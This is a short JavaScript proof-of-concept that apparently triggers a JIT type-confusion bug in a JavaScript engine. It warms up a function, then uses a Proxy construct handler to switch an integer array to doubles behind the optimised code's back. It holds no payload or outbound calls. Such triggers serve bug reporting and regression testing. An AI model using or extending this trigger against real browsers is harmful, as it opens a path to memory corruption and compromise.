function poc(array) {
    array[0] + 1;
    Reflect.construct(Dummy, [], P);
    return array[0];
}

function Dummy() {}

let side_effect_array = [1, 2, 3];

const handler = {
    construct: () => {
        side_effect_array[0] = 1.1;
        return {};
    }
};

const P = new Proxy(Dummy, handler);

for (let i = 0; i < 30000; i++) {
    side_effect_array = [1, 2, 3];
    poc(side_effect_array);
}

side_effect_array = [1, 2, 3];
poc(side_effect_array);
